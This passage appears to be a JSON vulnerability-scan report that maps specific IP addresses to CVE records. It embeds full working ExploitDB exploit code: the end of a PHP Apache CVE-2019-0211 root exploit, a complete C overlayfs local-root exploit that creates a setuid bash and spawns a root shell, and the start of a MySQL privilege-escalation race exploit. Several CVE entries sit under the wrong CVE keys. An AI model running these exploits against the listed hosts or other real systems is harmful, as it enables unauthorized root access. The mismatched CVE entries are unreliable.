$s_bucket_index[1];\r\n\t\t\t\t$this->abc[$l + 0x22] = $s_bucket_index[2];\r\n\t\t\t\t$this->abc[$l + 0x23] = $s_bucket_index[3];\r\n\t\t\t\to('  Changed bucket value to ' . $bucket_index);\r\n\t\t\t\t$min = $spray_min - $size_prefork_child_bucket * $bucket_index;\r\n\t\t\t\t$max = $spray_max - $size_prefork_child_bucket * $bucket_index;\r\n\t\t\t\to('  Ranges: 0x' . dechex($min) . ' - 0x' . dechex($max));\r\n\t\t\t\t# This bucket range is covered, go to the next one\r\n\t\t\t\t$bucket_index += $spray_nb_buckets;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif(count($workers_pids) > 0)\r\n\t\t{\r\n\t\t\to(\r\n\t\t\t\t'Unable to find PIDs ' .\r\n\t\t\t\timplode(', ', $workers_pids) .\r\n\t\t\t\t' in SHM, exiting.'\r\n\t\t\t);\r\n\t\t\texit();\r\n\t\t}\r\n\r\n\t\to('');\r\n\t\to('EXPLOIT SUCCESSFUL.');\r\n\t\to('Await 6:25AM.');\r\n\t\t\r\n\t\treturn 0;\r\n\t}\r\n}\r\n\r\nfunction o($msg)\r\n{\r\n\t# No concatenation -> no string allocation\r\n\tprint($msg);\r\n\tprint(\"\\n\");\r\n}\r\n\r\nfunction ptr2str($ptr, $m=8)\r\n{\r\n\t$out = \"\";\r\n    for ($i=0; $i<$m; $i++)\r\n    {\r\n        $out .= chr($ptr & 0xff);\r\n        $ptr >>= 8;\r\n    }\r\n    return $out;\r\n}\r\n\r\nfunction str2ptr(&$str, $p, $s=8)\r\n{\r\n\t$address = 0;\r\n\tfor($j=$s-1;$j>=0;$j--)\r\n\t{\r\n\t\t$address <<= 8;\r\n\t\t$address |= ord($str[$p+$j]);\r\n\t}\r\n\treturn $address;\r\n}\r\n\r\nfunction in($i, $range)\r\n{\r\n\treturn $i >= $range[0] && $i < $range[1];\r\n}\r\n\r\n/**\r\n * Finds the offset of a symbol in a file.\r\n */\r\nfunction find_symbol($file, $symbol)\r\n{\r\n    $elf = file_get_contents($file);\r\n    $e_shoff = str2ptr($elf, 0x28);\r\n    $e_shentsize = str2ptr($elf, 0x3a, 2);\r\n    $e_shnum = str2ptr($elf, 0x3c, 2);\r\n\r\n    $dynsym_off = 0;\r\n    $dynsym_sz = 0;\r\n    $dynstr_off = 0;\r\n\r\n    for($i=0;$i<$e_shnum;$i++)\r\n    {\r\n        $offset = $e_shoff + $i * $e_shentsize;\r\n        $sh_type = str2ptr($elf, $offset + 0x04, 4);\r\n\r\n        $SHT_DYNSYM = 11;\r\n        $SHT_SYMTAB = 2;\r\n        $SHT_STRTAB = 3;\r\n\r\n        switch($sh_type)\r\n        {\r\n            case $SHT_DYNSYM:\r\n                $dynsym_off = str2ptr($elf, $offset + 0x18, 8);\r\n                $dynsym_sz = str2ptr($elf, $offset + 0x20, 8);\r\n                break;\r\n            case $SHT_STRTAB:\r\n            case $SHT_SYMTAB:\r\n                if(!$dynstr_off)\r\n                    $dynstr_off = str2ptr($elf, $offset + 0x18, 8);\r\n                break;\r\n        }\r\n\r\n    }\r\n\r\n    if(!($dynsym_off && $dynsym_sz && $dynstr_off))\r\n        exit('.');\r\n\r\n    $sizeof_Elf64_Sym = 0x18;\r\n\r\n    for($i=0;$i * $sizeof_Elf64_Sym < $dynsym_sz;$i++)\r\n    {\r\n        $offset = $dynsym_off + $i * $sizeof_Elf64_Sym;\r\n        $st_name = str2ptr($elf, $offset, 4);\r\n        \r\n        if(!$st_name)\r\n            continue;\r\n        \r\n        $offset_string = $dynstr_off + $st_name;\r\n        $end = strpos($elf, \"\\x00\", $offset_string) - $offset_string;\r\n        $string = substr($elf, $offset_string, $end);\r\n\r\n        if($string == $symbol)\r\n        {\r\n            $st_value = str2ptr($elf, $offset + 0x8, 8);\r\n            return $st_value;\r\n        }\r\n    }\r\n\r\n    die('Unable to find symbol ' . $symbol);\r\n}\r\n\r\n# Obtains the addresses of the shared memory block and some functions through \r\n# /proc/self/maps\r\n# This is hacky as hell.\r\nfunction get_all_addresses()\r\n{\r\n\t$addresses = [];\r\n\t$data = file_get_contents('/proc/self/maps');\r\n\t$follows_shm = false;\r\n\r\n\tforeach(explode(\"\\n\", $data) as $line)\r\n\t{\r\n\t\tif(!isset($addresses['shm']) && strpos($line, '/dev/zero'))\r\n\t\t{\r\n            $line = explode(' ', $line)[0];\r\n            $bounds = array_map('hexdec', explode('-', $line));\r\n            if ($bounds[1] - $bounds[0] == 0x14000)\r\n            {\r\n                $addresses['shm'] = $bounds;\r\n                $follows_shm = true;\r\n            }\r\n        }\r\n\t\tif(\r\n\t\t\tpreg_match('#(/[^\\s]+libc-[0-9.]+.so[^\\s]*)#', $line, $matches) &&\r\n\t\t\tstrpos($line, 'r-xp')\r\n\t\t)\r\n\t\t{\r\n\t\t\t$offset = find_symbol($matches[1], 'system');\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$line = hexdec(explode('-', $line)[0]);\r\n\t\t\t$addresses['system'] = $line + $offset;\r\n\t\t}\r\n\t\tif(\r\n\t\t\tstrpos($line, 'libapr-1.so') &&\r\n\t\t\tstrpos($line, 'r-xp')\r\n\t\t)\r\n\t\t{\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$bounds = array_map('hexdec', explode('-', $line));\r\n\t\t\t$addresses['libaprX'] = $bounds;\r\n\t\t}\r\n\t\tif(\r\n\t\t\tstrpos($line, 'libapr-1.so') &&\r\n\t\t\tstrpos($line, 'r--p')\r\n\t\t)\r\n\t\t{\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$bounds = array_map('hexdec', explode('-', $line));\r\n\t\t\t$addresses['libaprR'] = $bounds;\r\n\t\t}\r\n\t\t# Apache's memory block is between the SHM and ld.so\r\n\t\t# Sometimes some rwx region gets mapped; all_buckets cannot be in there\r\n\t\t# but we include it anyways for the sake of simplicity\r\n\t\tif(\r\n\t\t\t(\r\n\t\t\t\tstrpos($line, 'rw-p') ||\r\n\t\t\t\tstrpos($line, 'rwxp')\r\n\t\t\t) &&\r\n            $follows_shm\r\n\t\t)\r\n\t\t{\r\n            if(strpos($line, '/lib'))\r\n            {\r\n                $follows_shm = false;\r\n                continue;\r\n            }\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$bounds = array_map('hexdec', explode('-', $line));\r\n\t\t\tif(!array_key_exists('apache', $addresses))\r\n\t\t\t    $addresses['apache'] = $bounds;\r\n\t\t\telse if($addresses['apache'][1] == $bounds[0])\r\n                $addresses['apache'][1] = $bounds[1];\r\n\t\t\telse\r\n                $follows_shm = false;\r\n\t\t}\r\n\t\tif(\r\n\t\t\tpreg_match('#(/[^\\s]+libphp7[0-9.]+.so[^\\s]*)#', $line, $matches) &&\r\n\t\t\tstrpos($line, 'r-xp')\r\n\t\t)\r\n\t\t{\r\n\t\t\t$offset = find_symbol($matches[1], 'zend_object_std_dtor');\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$line = hexdec(explode('-', $line)[0]);\r\n\t\t\t$addresses['zend_object_std_dtor'] = $line + $offset;\r\n\t\t}\r\n\t}\r\n\r\n\t$expected = [\r\n\t\t'shm', 'system', 'libaprR', 'libaprX', 'apache', 'zend_object_std_dtor'\r\n\t];\r\n\t$missing = array_diff($expected, array_keys($addresses));\r\n\r\n\tif($missing)\r\n\t{\r\n\t\to(\r\n\t\t\t'The following addresses were not determined by parsing ' .\r\n\t\t\t'/proc/self/maps: ' . implode(', ', $missing)\r\n\t\t);\r\n\t\texit(0);\r\n\t}\r\n\r\n\r\n\to('PID: ' . getmypid());\r\n\to('Fetching addresses');\r\n\r\n\tforeach($addresses as $k => $a)\r\n\t{\r\n\t\tif(!is_array($a))\r\n\t\t\t$a = [$a];\r\n\t\to('  ' . $k . ': ' . implode('-0x', array_map(function($z) {\r\n\t\t\t\treturn '0x' . dechex($z);\r\n\t\t}, $a)));\r\n\t}\r\n\to('');\r\n\r\n\treturn $addresses;\r\n}\r\n\r\n# Extracts PIDs of apache workers using /proc/*/cmdline and /proc/*/status,\r\n# matching the cmdline and the UID\r\nfunction get_workers_pids()\r\n{\r\n\to('Obtaining apache workers PIDs');\r\n\t$pids = [];\r\n\t$cmd = file_get_contents('/proc/self/cmdline');\r\n\t$processes = glob('/proc/*');\r\n\tforeach($processes as $process)\r\n\t{\r\n\t\tif(!preg_match('#^/proc/([0-9]+)$#', $process, $match))\r\n\t\t\tcontinue;\r\n\t\t$pid = (int) $match[1];\r\n\t\tif(\r\n\t\t\t!is_readable($process . '/cmdline') ||\r\n\t\t\t!is_readable($process . '/status')\r\n\t\t)\r\n\t\t\tcontinue;\r\n\t\tif($cmd !== file_get_contents($process . '/cmdline'))\r\n\t\t\tcontinue;\r\n\r\n\t\t$status = file_get_contents($process . '/status');\r\n\t\tforeach(explode(\"\\n\", $status) as $line)\r\n\t\t{\r\n\t\t\tif(\r\n\t\t\t\tstrpos($line, 'Uid:') === 0 &&\r\n\t\t\t\tpreg_match('#\\b' . posix_getuid() . '\\b#', $line)\r\n\t\t\t)\r\n\t\t\t{\r\n\t\t\t\to('  Found apache worker: ' . $pid);\r\n\t\t\t\t$pids[$pid] = $pid;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\r\n\t\t}\r\n\t}\r\n\t\r\n\to('Got ' . sizeof($pids) . ' PIDs.');\r\n\to('');\r\n\r\n\treturn $pids;\r\n}\r\n\r\n$addresses = get_all_addresses();\r\n$workers_pids = get_workers_pids();\r\nreal();",
                "description": "Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation",
                "author": "cfreal",
                "_id": 46676,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2019-04-08T00:00:00+00:00",
                "cve": [
                    "CVE-2019-0211",
                    "cve-2019-0211"
                ],
                "type": "local",
                "port": 0
            }
        ],
        "CVE-2018-11763": [
            {
                "source": "CVE",
                "_id": "2018-11763",
                "description": "In Apache HTTP Server 2.4.17 to 2.4.34, by sending continuous, large SETTINGS frames a client can occupy a connection, server thread and CPU time without any connection timeout coming to effect. This affects only HTTP/2 connections. A possible mitigation is to not enable the h2 protocol.",
                "osvdb": [],
                "bid": [
                    105414
                ],
                "cve": [
                    "CVE-2018-11763"
                ],
                "msb": []
            }
        ],
        "CVE-2020-1968": [],
        "CVE-2019-1551": [
            {
                "source": "CVE",
                "_id": "2019-1551",
                "description": "There is an overflow bug in the x64_64 Montgomery squaring procedure used in exponentiation with 512-bit moduli. No EC algorithms are affected. Analysis suggests that attacks against 2-prime RSA1024, 3-prime RSA1536, and DSA1024 as a result of this defect would be very difficult to perform and are not believed likely. Attacks against DH512 are considered just feasible. However, for an attack the target would have to re-use the DH512 private key, which is not recommended anyway. Also applications directly using the low level API BN_mod_exp may be affected if they use BN_FLG_CONSTTIME. Fixed in OpenSSL 1.1.1e (Affected 1.1.1-1.1.1d). Fixed in OpenSSL 1.0.2u (Affected 1.0.2-1.0.2t).",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2019-1551"
                ],
                "msb": []
            }
        ],
        "CVE-2020-1971": [],
        "CVE-2018-8011": [
            {
                "source": "CVE",
                "_id": "2018-8011",
                "description": "By specially crafting HTTP requests, the mod_md challenge handler would dereference a NULL pointer and cause the child process to segfault. This could be used to DoS the server. Fixed in Apache HTTP Server 2.4.34 (Affected 2.4.33).",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2018-8011"
                ],
                "msb": []
            }
        ],
        "CVE-2018-17199": [
            {
                "source": "CVE",
                "_id": "2018-17199",
                "description": "In Apache HTTP Server 2.4 release 2.4.37 and prior, mod_session checks the session expiry time before decoding the session. This causes session expiry time to be ignored for mod_session_cookie sessions since the expiry time is loaded when the session is decoded.",
                "osvdb": [],
                "bid": [
                    106742
                ],
                "cve": [
                    "CVE-2018-17199"
                ],
                "msb": []
            }
        ]
    },
    "152.1.136.212": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ],
        "CVE-2017-15906": [
            {
                "source": "CVE",
                "_id": "2017-15906",
                "description": "The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.",
                "osvdb": [],
                "bid": [
                    101552
                ],
                "cve": [
                    "CVE-2017-15906"
                ],
                "msb": []
            }
        ]
    },
    "152.1.136.217": {
        "CVE-2016-8858": [
            {
                "source": "CVE",
                "_id": "2016-8858",
                "description": "** DISPUTED ** The kex_input_kexinit function in kex.c in OpenSSH 6.x and 7.x through 7.3 allows remote attackers to cause a denial of service (memory consumption) by sending many duplicate KEXINIT requests.  NOTE: a third party reports that \"OpenSSH upstream does not consider this as a security issue.\"",
                "osvdb": [],
                "bid": [
                    93776
                ],
                "cve": [
                    "CVE-2016-8858"
                ],
                "msb": []
            }
        ]
    },
    "152.1.136.223": {
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ],
        "CVE-2014-0118": [
            {
                "source": "CVE",
                "_id": "2014-0118",
                "description": "The deflate_in_filter function in mod_deflate.c in the mod_deflate module in the Apache HTTP Server before 2.4.10, when request body decompression is enabled, allows remote attackers to cause a denial of service (resource consumption) via crafted request data that decompresses to a much larger size.",
                "osvdb": [],
                "bid": [
                    68745
                ],
                "cve": [
                    "CVE-2014-0118"
                ],
                "msb": []
            }
        ]
    },
    "152.1.160.78": {
        "CVE-2010-1899": [
            {
                "source": "CVE",
                "_id": "2010-1899",
                "description": "Stack consumption vulnerability in the ASP implementation in Microsoft Internet Information Services (IIS) 5.1, 6.0, 7.0, and 7.5 allows remote attackers to cause a denial of service (daemon outage) via a crafted request, related to asp.dll, aka \"IIS Repeated Parameter Request Denial of Service Vulnerability.\"",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2010-1899"
                ],
                "msb": [
                    "MS10-065"
                ]
            }
        ],
        "CVE-2010-2730": [
            {
                "source": "CVE",
                "_id": "2010-2730",
                "description": "Buffer overflow in Microsoft Internet Information Services (IIS) 7.5, when FastCGI is enabled, allows remote attackers to execute arbitrary code via crafted headers in a request, aka \"Request Header Buffer Overflow Vulnerability.\"",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2010-2730"
                ],
                "msb": [
                    "MS10-065"
                ]
            },
            {
                "source": "CVE",
                "_id": "2014-2730",
                "description": "The XML parser in Microsoft Office 2007 SP3, 2010 SP1 and SP2, and 2013, and Office for Mac 2011, does not properly detect recursion during entity expansion, which allows remote attackers to cause a denial of service (memory consumption and persistent application hang) via a crafted XML document containing a large number of nested entity references, as demonstrated by a crafted text/plain e-mail message to Outlook, a similar issue to CVE-2003-1564.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-2730"
                ],
                "msb": []
            }
        ]
    },
    "152.1.160.229": {
        "CVE-2014-2532": [
            {
                "source": "CVE",
                "_id": "2014-2532",
                "description": "sshd in OpenSSH before 6.6 does not properly support wildcards on AcceptEnv lines in sshd_config, which allows remote attackers to bypass intended environment restrictions by using a substring located before a wildcard character.",
                "osvdb": [],
                "bid": [
                    66355
                ],
                "cve": [
                    "CVE-2014-2532"
                ],
                "msb": []
            }
        ]
    },
    "152.1.160.232": {},
    "152.1.162.47": {
        "CVE-2016-10708": [
            {
                "source": "CVE",
                "_id": "2016-10708",
                "description": "sshd in OpenSSH before 7.4 allows remote attackers to cause a denial of service (NULL pointer dereference and daemon crash) via an out-of-sequence NEWKEYS message, as demonstrated by Honggfuzz, related to kex.c and packet.c.",
                "osvdb": [],
                "bid": [
                    102780
                ],
                "cve": [
                    "CVE-2016-10708"
                ],
                "msb": []
            }
        ],
        "CVE-2016-0777": [
            {
                "source": "CVE",
                "_id": "2016-10119",
                "description": "Firejail uses 0777 permissions when mounting /tmp, which allows local users to gain privileges.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2016-10119"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2016-10120",
                "description": "Firejail uses 0777 permissions when mounting (1) /dev, (2) /dev/shm, (3) /var/tmp, or (4) /var/lock, which allows local users to gain privileges.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2016-10120"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2016-0777",
                "description": "The resend_bytes function in roaming_common.c in the client in OpenSSH 5.x, 6.x, and 7.x before 7.1p2 allows remote servers to obtain sensitive information from process memory by requesting transmission of an entire buffer, as demonstrated by reading a private key.",
                "osvdb": [],
                "bid": [
                    80695
                ],
                "cve": [
                    "CVE-2016-0777"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2016-8605",
                "description": "The mkdir procedure of GNU Guile temporarily changed the process' umask to zero. During that time window, in a multithreaded application, other threads could end up creating files with insecure permissions. For example, mkdir without the optional mode argument would create directories as 0777. This is fixed in Guile 2.0.13. Prior versions are affected.",
                "osvdb": [],
                "bid": [
                    93510
                ],
                "cve": [
                    "CVE-2016-8605"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0769",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102396
                ],
                "cve": [
                    "CVE-2018-0769"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0776",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102401
                ],
                "cve": [
                    "CVE-2018-0776"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0770",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102397
                ],
                "cve": [
                    "CVE-2018-0770"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0758",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102405
                ],
                "cve": [
                    "CVE-2018-0758"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0777",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102402
                ],
                "cve": [
                    "CVE-2018-0777"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0781",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, and CVE-2018-0778.",
                "osvdb": [],
                "bid": [
                    102404
                ],
                "cve": [
                    "CVE-2018-0781"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0772",
                "description": "Internet Explorer in Microsoft Windows 7 SP1, Windows Server 2008 and R2 SP1, Windows 8.1 and Windows RT 8.1, Windows Server 2012 and R2, and Internet Explorer and Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102409
                ],
                "cve": [
                    "CVE-2018-0772"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0762",
                "description": "Internet Explorer in Microsoft Windows 7 SP1, Windows Server 2008 and R2 SP1, Windows 8.1 and Windows RT 8.1, Windows Server 2012 and R2, and Internet Explorer and Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102408
                ],
                "cve": [
                    "CVE-2018-0762"
                ],
                "msb": []
            },
            {
                "code": "/*\r\njust another overlayfs exploit, works on kernels before 2015-12-26\r\n\r\n# Exploit Title: overlayfs local root\r\n# Date: 2016-01-05\r\n# Exploit Author: rebel\r\n# Version: Ubuntu 14.04 LTS, 15.10 and more\r\n# Tested on: Ubuntu 14.04 LTS, 15.10\r\n# CVE : CVE-2015-8660\r\n\r\nblah@ubuntu:~$ id\r\nuid=1001(blah) gid=1001(blah) groups=1001(blah)\r\nblah@ubuntu:~$ uname -a && cat /etc/issue\r\nLinux ubuntu 3.19.0-42-generic #48~14.04.1-Ubuntu SMP Fri Dec 18 10:24:49 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux\r\nUbuntu 14.04.3 LTS \\n \\l\r\nblah@ubuntu:~$ ./overlayfail\r\nroot@ubuntu:~# id\r\nuid=0(root) gid=1001(blah) groups=0(root),1001(blah)\r\n\r\n12/2015\r\nby rebel\r\n\r\n6354b4e23db225b565d79f226f2e49ec0fe1e19b\r\n*/\r\n\r\n#include <stdio.h>\r\n#include <sched.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <sched.h>\r\n#include <sys/stat.h>\r\n#include <sys/types.h>\r\n#include <sys/mount.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <sched.h>\r\n#include <sys/stat.h>\r\n#include <sys/types.h>\r\n#include <sys/mount.h>\r\n#include <sys/types.h>\r\n#include <signal.h>\r\n#include <fcntl.h>\r\n#include <string.h>\r\n#include <linux/sched.h>\r\n#include <sys/wait.h>\r\n\r\nstatic char child_stack[1024*1024];\r\n\r\nstatic int\r\nchild_exec(void *stuff)\r\n{\r\n    system(\"rm -rf /tmp/haxhax\");\r\n    mkdir(\"/tmp/haxhax\", 0777);\r\n    mkdir(\"/tmp/haxhax/w\", 0777);\r\n    mkdir(\"/tmp/haxhax/u\",0777);\r\n    mkdir(\"/tmp/haxhax/o\",0777);\r\n\r\n    if (mount(\"overlay\", \"/tmp/haxhax/o\", \"overlay\", MS_MGC_VAL, \"lowerdir=/bin,upperdir=/tmp/haxhax/u,workdir=/tmp/haxhax/w\") != 0) {\r\n\tfprintf(stderr,\"mount failed..\\n\");\r\n    }\r\n\r\n    chmod(\"/tmp/haxhax/w/work\",0777);\r\n    chdir(\"/tmp/haxhax/o\");\r\n    chmod(\"bash\",04755);\r\n    chdir(\"/\");\r\n    umount(\"/tmp/haxhax/o\");\r\n    return 0;\r\n}\r\n\r\nint\r\nmain(int argc, char **argv)\r\n{\r\n    int status;\r\n    pid_t wrapper, init;\r\n    int clone_flags = CLONE_NEWNS | SIGCHLD;\r\n    struct stat s;\r\n\r\n    if((wrapper = fork()) == 0) {\r\n        if(unshare(CLONE_NEWUSER) != 0)\r\n            fprintf(stderr, \"failed to create new user namespace\\n\");\r\n\r\n        if((init = fork()) == 0) {\r\n            pid_t pid =\r\n                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);\r\n            if(pid < 0) {\r\n                fprintf(stderr, \"failed to create new mount namespace\\n\");\r\n                exit(-1);\r\n            }\r\n\r\n            waitpid(pid, &status, 0);\r\n\r\n        }\r\n\r\n        waitpid(init, &status, 0);\r\n        return 0;\r\n    }\r\n\r\n    usleep(300000);\r\n\r\n    wait(NULL);\r\n\r\n    stat(\"/tmp/haxhax/u/bash\",&s);\r\n\r\n    if(s.st_mode == 0x89ed)\r\n        execl(\"/tmp/haxhax/u/bash\",\"bash\",\"-p\",\"-c\",\"rm -rf /tmp/haxhax;python -c \\\"import os;os.setresuid(0,0,0);os.execl('/bin/bash','bash');\\\"\",NULL);\r\n\r\n    fprintf(stderr,\"couldn't create suid :(\\n\");\r\n    return -1;\r\n}",
                "description": "Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1)",
                "author": "rebel",
                "_id": 39166,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2016-01-05T00:00:00+00:00",
                "cve": [
                    "CVE-2015-8660"
                ],
                "type": "local",
                "port": 0
            },
            {
                "code": "/*\r\n\r\nSource: https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html // http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c\r\n\r\nMySQL/PerconaDB/MariaDB - Privilege Escalation / Race Condition PoC Exploit\r\nmysql-privesc-race.c (ver. 1.0)\r\n\r\nCVE-2016-6663 / OCVE-2016-5616\r\n\r\nDiscovered/Coded by:\r\n\r\nDawid Golunski\r\ndawid[at]legalhackers.com\r\nhttps://legalhackers.com\r\n\r\nFollow https://twitter.com/dawid_golunski for updates on this advisory.\r\n\r\n\r\nCompile:\r\ngcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient\r\n\r\nNote:\r\n* On RedHat-based systems you might need to change /tmp to another public directory (e.g. /uploads)\r\n\r\n* For testing purposes only. Do no harm.  \r\n\r\nFull advisory URL:\r\nhttps://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html\r\n\r\nVideo PoC:\r\nhttps://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html\r\n\r\n*/\r\n\r\n\r\n#include <fcntl.h>\r\n#include <grp.h>\r\n#include <mysql.h>\r\n#include <pwd.h>\r\n#include <stdint.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <sys/inotify.h>\r\n#include <sys/stat.h>\r\n#include <sys/types.h>\r\n#include <sys/wait.h>\r\n#include <time.h>\r\n#include <unistd.h>\r\n\r\n\r\n#define EXP_PATH          \"/tmp/mysql_privesc_exploit\"\r\n#define EXP_DIRN          \"mysql_privesc_exploit\"\r\n#define MYSQL_TAB_FILE    EXP_PATH \"/exploit_table.MYD\"\r\n#define MYSQL_TEMP_FILE   EXP_PATH \"/exploit_table.TMD\"\r\n\r\n#define SUID_SHELL   \t  EXP_PATH \"/mysql_suid_shell.MYD\"\r\n\r\n#define MAX_DELAY 1000    // can be used in the race to adjust the timing if necessary\r\n\r\nMYSQL *conn;\t\t  // DB handles\r\nMYSQL_RES *res;\r\nMYSQL_ROW row;\r\n\r\nunsigned long cnt;\r\n\r\n\r\nvoid intro() {\r\n\r\nprintf( \r\n        \"\\033[94m\\n\"\r\n        